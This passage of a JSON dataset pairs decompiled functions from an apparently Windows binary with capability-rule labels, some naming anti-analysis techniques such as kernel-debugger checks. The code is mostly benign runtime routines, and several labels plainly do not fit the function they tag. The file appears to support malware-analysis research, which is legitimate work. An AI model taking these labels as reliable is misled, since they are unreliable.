((uVar7 >> 0x20 == 0) && (uVar7 < 0x80000001)) {\n        uVar8 = fcn.00464420(uVar5, 0, uVar4, 0);\n        iVar9 = fcn.00464420(uVar7, 0, 0, 1);\n        uVar2 = uVar8 + iVar9;\n        if (uVar8 <= uVar2) {\n            if (uVar1 < '\\0') {\n                uVar2 = CONCAT44(-((uVar2 >> 0x20) + (uVar2 != 0)), -uVar2);\n            }\n            if (-1 < (uVar2 >> 0x20 ^ arg_ch ^ in_ECX[1])) {\n                uVar3 = 0;\n                goto code_r0x0043b1ad;\n            }\n        }\n    }\n    uVar3 = 1;\n    if (uVar1 < '\\0') {\n        uVar2 = 0x8000000000000000;\n    }\n    else {\n        uVar2 = 0x7fffffffffffffff;\n    }\ncode_r0x0043b1ad:\n    *arg_8h = uVar2;\n    arg_8h[1] = uVar2 >> 0x20;\n    arg_8h[2] = uVar3;\n    return;\n}\n",
        "token_count": 752
    },
    "0043ba75": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043ba75(uint noname_0, int32_t noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, \n            uint noname_6, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if ((noname_2 != 0) && (noname_1 == 0)) {\n        fcn.00411e42();\n    }\n    if ((~*(var_8h + 0x18) & 1) == 0) {\n        for (; noname_2 != 0; noname_2 = noname_2 + -1) {\n            fcn.0043b80d(var_8h, noname_1);\n            noname_1 = noname_1 + 0x10;\n        }\n    }\n    else {\n        for (; noname_2 != 0; noname_2 = noname_2 + -1) {\n            fcn.0043a5e8();\n            fcn.0043b60d(var_8h, noname_1, uStack32, uStack28, uStack24);\n            noname_1 = noname_1 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0043cc93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0043cc93(uint *param_1, uint8_t param_2)\n\n{\n    uint *puVar1;\n    \n    if ((param_2 & 2) == 0) {\n        fcn.00402740();\n        puVar1 = param_1;\n        if ((param_2 & 1) != 0) {\n            fcn.004115a4(param_1);\n        }\n    }\n    else {\n        puVar1 = param_1 + -1;\n        fcn.004644c4(param_1, 4, *puVar1, fcn.0040f650);\n        if ((param_2 & 1) != 0) {\n            fcn.004115a4(puVar1);\n        }\n    }\n    return puVar1;\n}\n",
        "token_count": 180
    },
    "0044ab73": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044ab73(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    uint arg_8h;\n    uint in_stack_fffffff4;\n    \n    if (param_2 != 0) goto code_r0x0044ab89;\n    in_stack_fffffff4 = *(param_1 + 0x14);\n    arg_8h = 6;\n    while( true ) {\n        fcn.004299a5(arg_8h, in_stack_fffffff4);\ncode_r0x0044ab89:\n        if ((~*(param_1 + 0x18) & 1) != 0) break;\n        arg_8h = 1;\n    }\n    if (*(param_2 + 8) == 0xffff) {\n        fcn.00411e28();\n    }\n    fcn.0044aa7a(0);\n    puVar2 = fcn.00432abc(param_2);\n    uVar1 = *puVar2;\n    if (uVar1 == 0) {\n        fcn.004102e0(0xffff);\n        fcn.0042a1db(param_1);\n        fcn.0044aa66();\n        puVar3 = fcn.00432abc(param_2);\n        *puVar3 = *(param_1 + 0x34);\n        *(param_1 + 0x34) = *(param_1 + 0x34) + 1;\n    }\n    else if (uVar1 < 0x7fff) {\n        fcn.004102e0(uVar1 | 0x8000);\n    }\n    else {\n        fcn.004102e0(0x7fff);\n        fcn.00410320(uVar1 | 0x80000000);\n    }\n    return;\n}\n",
        "token_count": 426
    },
    "0044ac1c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0044ac1c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint uVar6;\n    uint var_4h;\n    \n    var_4h = 0x44ac28;\n    fcn.004627af(0x10);\n    if ((*(arg_8h_00 + 0x18) & 1) != 0) goto code_r0x0044ac3a;\n    var_4h = *(arg_8h_00 + 0x14);\n    uVar6 = 1;\ncode_r0x0044ac35:\n    do {\n        while( true ) {\n            fcn.004299a5(uVar6, var_4h);\ncode_r0x0044ac3a:\n            if ((*(unaff_EBP + 8) != 0) && (*(*(unaff_EBP + 8) + 8) == 0xffff)) {\n                fcn.00411e28();\n            }\n            fcn.0044aa7a(0);\n            fcn.00410360(unaff_EBP + -0x10);\n            if (*(unaff_EBP + -0x10) == 0x7fff) {\n                fcn.004103b0(unaff_EBP + -0x18);\n                uVar4 = *(unaff_EBP + -0x18);\n            }\n            else {\n                uVar4 = (*(unaff_EBP + -0x10) & 0xffff8000) << 0x10 | *(unaff_EBP + -0x10) & 0xffff7fff;\n                *(unaff_EBP + -0x18) = uVar4;\n            }\n            if (uVar4 < 0) break;\n            if (*(unaff_EBP + 0x10) != NULL) {\n                **(unaff_EBP + 0x10) = uVar4;\n                goto code_r0x0044add3;\n            }\ncode_r0x0044ac9f:\n            uVar6 = 5;\n        }\n        if (*(unaff_EBP + -0x10) != -1) {\n            uVar4 = uVar4 & 0x7fffffff;\n            if ((uVar4 != 0) && (uVar4 <= *(*(arg_8h_00 + 0x38) + 8) - 1U)) {\n                iVar2 = fcn.00437739(uVar4);\n                iVar1 = *(arg_8h_00 + 0x3c);\n                *(unaff_EBP + -0x14) = 0;\n                if ((iVar1 == 0) || (iVar1 = fcn.0043294a(iVar2, unaff_EBP + -0x1c),  iVar1 == 0)) {\n                    uVar5 = *(iVar2 + 8) & 0x7fffffff;\n                }\n                else {\n                    uVar5 = *(unaff_EBP + -0x1c);\n                }\n                uVar4 = *(unaff_EBP + -0x18);\n                *(unaff_EBP + -0x14) = uVar5;\n                goto code_r0x0044ad9f;\n            }\n            goto code_r0x0044ac9f;\n        }\n        iVar1 = fcn.00429f54(arg_8h_00, unaff_EBP + -0x14);\n        if (iVar1 != 0) {\n            if ((*(iVar1 + 8) & 0x7fffffff) != *(unaff_EBP + -0x14)) {\n                if (-1 < *(iVar1 + 8)) {\n                    uVar6 = 7;\n                    goto code_r0x0044ac35;\n                }\n                if (*(arg_8h_00 + 0x3c) == 0) {\n                    iVar2 = fcn.00411579(0x1c);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    *(unaff_EBP + -4) = 0;\n                    if (iVar2 == 0) {\n                        uVar6 = 0;\n                    }\n                    else {\n                        uVar6 = fcn.00432a35(10);\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    *(arg_8h_00 + 0x3c) = uVar6;\n                }\n                uVar6 = *(unaff_EBP + -0x14);\n                puVar3 = fcn.00432abc(iVar1);\n                *puVar3 = uVar6;\n                uVar4 = *(unaff_EBP + -0x18);\n            }\n            fcn.0044aa66();\n            iVar2 = *(arg_8h_00 + 0x34);\n            *(arg_8h_00 + 0x34) = iVar2 + 1;\n            fcn.0044bd84(iVar2, iVar1, 1);\n            uVar5 = *(unaff_EBP + -0x14);\ncode_r0x0044ad9f:\n            if (*(unaff_EBP + 8) == 0) goto code_r0x0044adba;\n            iVar1 = fcn.0042f503();\n            if (iVar1 != 0) {\n                uVar5 = *(unaff_EBP + -0x14);\ncode_r0x0044adba:\n                if (*(unaff_EBP + 0xc) == NULL) {\n                    *(arg_8h_00 + 0x10) = uVar5;\n                }\n                else {\n                    **(unaff_EBP + 0xc) = uVar5;\n                }\n                if (*(unaff_EBP + 0x10) != NULL) {\n                    **(unaff_EBP + 0x10) = uVar4;\n                }\ncode_r0x0044add3:\n                fcn.00462887();\n                return;\n            }\n        }\n        uVar6 = 6;\n    } while( true );\n}\n",
        "token_count": 1496
    },
    "0044adf9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044adf9(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t *in_stack_fffffff8;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        in_stack_fffffff8 = *(param_1 + 0x14);\n        fcn.004299a5(2, in_stack_fffffff8);\n    }\n    fcn.0044aa7a(0);\n    if (in_stack_fffffff8 == NULL) {\n        fcn.004102e0(0);\n    }\n    else {\n        puVar2 = fcn.00432abc(in_stack_fffffff8);\n        uVar1 = *puVar2;\n        if (uVar1 == 0) {\n            uVar3 = (***in_stack_fffffff8)();\n            fcn.0044ab73(uVar3);\n            fcn.0044aa66();\n            puVar4 = fcn.00432abc(in_stack_fffffff8);\n            *puVar4 = *(param_1 + 0x34);\n            *(param_1 + 0x34) = *(param_1 + 0x34) + 1;\n            (**(*in_stack_fffffff8 + 8))(param_1);\n        }\n        else if (uVar1 < 0x7fff) {\n            fcn.004102e0(uVar1);\n        }\n        else {\n            fcn.004102e0(0x7fff);\n            fcn.00410320(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "0044ae90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0044ae90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *arg_ch;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint uVar3;\n    uint var_4h;\n    \n    var_4h = 0x44ae9c;\n    fcn.004627e2(0x14);\n    if ((*(extraout_ECX + 0x18) & 1) != 0) goto code_r0x0044aeae;\n    var_4h = *(extraout_ECX + 0x14);\n    uVar3 = 4;\n    while( true ) {\n        fcn.004299a5(uVar3, var_4h);\ncode_r0x0044aeae:\n        iVar1 = fcn.0044ac1c(*(unaff_EBP + 8), unaff_EBP + -0x1c, unaff_EBP + -0x14);\n        *(unaff_EBP + -0x18) = 0;\n        if (iVar1 != 0) break;\n        uVar2 = *(*(extraout_ECX + 0x38) + 8) - 1;\n        if (*(unaff_EBP + -0x14) < uVar2 || *(unaff_EBP + -0x14) == uVar2) {\n            iVar1 = fcn.00437739(*(unaff_EBP + -0x14));\n            if ((iVar1 == 0) || (*(unaff_EBP + 8) == 0)) goto code_r0x0044af4a;\n            iVar1 = fcn.0042f538(*(unaff_EBP + 8));\n            if (iVar1 != 0) goto code_r0x0044af4a;\n            uVar3 = 6;\n        }\n        else {\n            uVar3 = 5;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    arg_ch = fcn.0042f4a6();\n    *(unaff_EBP + -0x18) = arg_ch;\n    if (arg_ch == NULL) {\n        fcn.00411e0e();\n    }\n    fcn.0044aa66();\n    iVar1 = *(extraout_ECX + 0x34);\n    *(extraout_ECX + 0x34) = iVar1 + 1;\n    fcn.0044bd84(iVar1, arg_ch, 1);\n    uVar3 = *(extraout_ECX + 0x10);\n    *(extraout_ECX + 0x10) = *(unaff_EBP + -0x1c);\n    (**(*arg_ch + 8))(extraout_ECX);\n    *(extraout_ECX + 0x10) = uVar3;\ncode_r0x0044af4a:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 743
    },
    "004510d1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004510d1(int32_t param_1, int32_t **param_2)\n\n{\n    if (((~param_2[6] & 1) == 0) && (*(param_1 + 0x20) == 0)) {\n        (**(**param_2 + 0xbc))(param_1);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00457f54": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00457f54(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t unaff_retaddr;\n    \n    if ((((param_2 >> 0x1f & 1U) == 0) || ((param_2 & 0x1fff0000) != 0x30000)) ||\n       (uVar2 = param_2 & 0xffff,  0xff < uVar2)) {\n        if ((param_2 == 0x80030100) || (((-0x7ffcff00 < param_2 && (-0x7ffcfefb < param_2)) && (param_2 == 0x80030106)))\n           ) {\n            uVar1 = 0xb;\n        }\n        else {\n            uVar1 = 1;\n        }\n    }\n    else {\n        uVar1 = fcn.004413b1(uVar2);\n        param_2 = uVar2;\n    }\n    *(unaff_retaddr + 8) = uVar1;\n    *(unaff_retaddr + 0xc) = param_2;\n    return;\n}\n",
        "token_count": 261
    },
    "0045ba7e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0045ba7e(uint *param_1, uint8_t param_2)\n\n{\n    if (param_1[2] != 0) {\n        fcn.004115a4(*param_1);\n    }\n    if ((param_2 & 1) != 0) {\n        fcn.004115a4(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 93
    },
    "0045bcd7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bcd7(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.00411e42();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0xaaaaaaa;\n            if (arg_10h < 0xaaaaaaa) {\n                uVar1 = arg_10h;\n            }\n            fcn.00410400();\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0xaaaaaaa;\n            if (arg_10h < 0xaaaaaaa) {\n                uVar1 = arg_10h;\n            }\n            fcn.00429fd7(arg_ch, uVar1 * 0xc);\n            arg_ch = arg_ch + uVar1 * 0xc;\n        }\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "0045c68b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045c68b(uint arg_8h, uint hKey, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.ADVAPI32.dll_RegSetValueA;\n    uVar1 = arg_10h & 1;\n    if ((uVar1 == 0) ||\n       ((iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)(arg_8h, \"Insertable\", 1, 0x4939a0, 0),  iVar3 == 0 &&\n        (iVar3 = (*pcVar2)(hKey, \"Insertable\", 1, 0x4939a0, 0),  iVar3 == 0)))) {\n        pcVar4 = NULL;\n        if ((arg_10h & 2) != 0) {\n            pcVar4 = \"Apartment\";\n        }\n        if ((arg_10h & 4) != 0) {\n            pcVar4 = \"Free\";\n        }\n        if ((arg_10h & 6) == 6) {\n            pcVar4 = \"Both\";\n        }\n        if (pcVar4 != NULL) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(hKey, \"InprocServer32\", 0, 0x20006, &arg_10h);\n            bVar5 = iVar3 == 0;\n            if (bVar5) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar4);\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(arg_10h, \"ThreadingModel\", 0, 1, pcVar4, iVar3 + 1);\n                bVar5 = iVar3 == 0;\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(arg_10h);\n            }\n            else {\n                iVar3 = fcn.0043026e();\n                if (*(iVar3 + 0x14) == '\\0') {\n                    bVar5 = true;\n                }\n            }\n            if (bVar5 == false) goto code_r0x0045c6cd;\n        }\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\ncode_r0x0045c6cd:\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegDeleteValueA;\n        if (uVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(hKey, \"Insertable\");\n            (*pcVar2)(arg_8h, \"Insertable\");\n        }\n    }\n    return bVar5;\n}\n",
        "token_count": 626
    },
    "004739d1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004739d1(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = fcn.00467bf8();\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    if (*0x4bc148 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x49d0c8),  iVar2 == 0)) {\n            return 0;\n        }\n        *0x4bc148 = fcn.00467b95(iVar2);\n        uVar3 = (*pcVar4)(iVar1, 0x49d0b8);\n        *0x4bc14c = fcn.00467b95(uVar3);\n        uVar3 = (*pcVar4)(iVar1, 0x49d0a4);\n        *0x4bc150 = fcn.00467b95(uVar3);\n        iVar2 = fcn.00463a95(&var_8h);\n        if (iVar2 != 0) {\n            fcn.00466d7a(0, 0, 0, 0, 0);\n        }\n        if (var_8h == 2) {\n            uVar3 = (*pcVar4)(iVar1, \"GetUserObjectInformationA\");\n            *0x4bc158 = fcn.00467b95(uVar3);\n            if (*0x4bc158 != 0) {\n                uVar3 = (*pcVar4)(iVar1, \"GetProcessWindowStation\");\n                *0x4bc154 = fcn.00467b95(uVar3);\n            }\n        }\n    }\n    iVar1 = var_10h;\n    if ((*0x4bc154 == var_10h) || (*0x4bc158 == var_10h)) {\ncode_r0x00473b1f:\n        if (*0x4bc14c != iVar1) {\n            pcVar4 = fcn.00467c01(*0x4bc14c);\n            var_4h = (*pcVar4)();\n            if ((var_4h != 0) && (*0x4bc150 != iVar1)) {\n                pcVar4 = fcn.00467c01(*0x4bc150, var_4h);\n                var_4h = (*pcVar4)();\n            }\n        }\n    }\n    else {\n        pcVar4 = fcn.00467c01(*0x4bc154);\n        iVar2 = (*pcVar4)();\n        if (iVar2 != 0) {\n            pcVar4 = fcn.00467c01(*0x4bc158, iVar2, 1, &var_20h, 0xc, &var_14h);\n            iVar2 = (*pcVar4)();\n            if ((iVar2 != 0) && ((var_18h & 1) != 0)) goto code_r0x00473b1f;\n        }\n        iVar1 = fcn.00463b44(&var_ch);\n        if (iVar1 != 0) {\n            fcn.00466d7a(0, 0, 0, 0, 0);\n        }\n        if (var_ch < 4) {\n            arg_10h = arg_10h | 0x40000;\n        }\n        else {\n            arg_10h = arg_10h | 0x200000;\n        }\n    }\n    pcVar4 = fcn.00467c01(*0x4bc148, var_4h, arg_8h, arg_ch, arg_10h);\n    uVar3 = (*pcVar4)();\n    return uVar3;\n}\n",
        "token_count": 967
    },
    "0047c9b2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0047c9b2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b0af8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00462f99();\n        *puVar2 = 0;\n        puVar2 = fcn.00462f86();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4bd318)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4bd320;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x28;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.004811c2(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00462f86();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00462f99();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0047c3ec(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0047ca84(0x4b0af8);\n                goto code_r0x0047ca7e;\n            }\n        }\n        puVar2 = fcn.00462f99();\n        *puVar2 = 0;\n        puVar2 = fcn.00462f86();\n        *puVar2 = 9;\n        fcn.00466eae(0, 0, 0, 0, 0);\n    }\ncode_r0x0047ca7e:\n    fcn.00463841();\n    return;\n}\n",
        "token_count": 639
    },
    "0047ff5a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047ff5a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.004628d4(arg_10h);\n    var_14h = fcn.00483f80(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00482e61(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0047ffb1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0047fff1;\n        }\n        if (iVar1 != 2) {\ncode_r0x0047ffe3:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0047fff1;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0047ffe3;\n        goto code_r0x0047ffb1;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0047fff1:\n    fcn.0045e747(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "004800cd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004800cd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.004628d4(arg_10h);\n    var_14h = fcn.00483f80(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.004833a3(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00480124:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00480164;\n        }\n        if (iVar1 != 2) {\ncode_r0x00480156:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00480164;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00480156;\n        goto code_r0x00480124;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00480164:\n    fcn.0045e747(unaff_EBX);\n    return;\n}\n",
        "token_count": 496
    },
    "004825c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004825c6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b0d08, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00462f99();\n        *puVar2 = 0;\n        puVar2 = fcn.00462f86();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4bd318)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4bd320;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x28;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.004811c2(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00462f86();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00462f99();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00482024(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00482698(0x4b0d08);\n                goto code_r0x00482692;\n            }\n        }\n        puVar2 = fcn.00462f99();\n        *puVar2 = 0;\n        puVar2 = fcn.00462f86();\n        *puVar2 = 9;\n        fcn.00466eae(0, 0, 0, 0, 0);\n    }\ncode_r0x00482692:\n    fcn.00463841();\n    return;\n}\n",
        "token_count": 630
    },
    "004020b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004020b0(int32_t **param_1)\n\n{\n    int32_t **arg_8h;\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    while (piVar1 != NULL) {\n        arg_8h = *param_1;\n        *param_1 = *arg_8h;\n        fcn.0045e756(arg_8h);\n        piVar1 = *param_1;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00402380": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
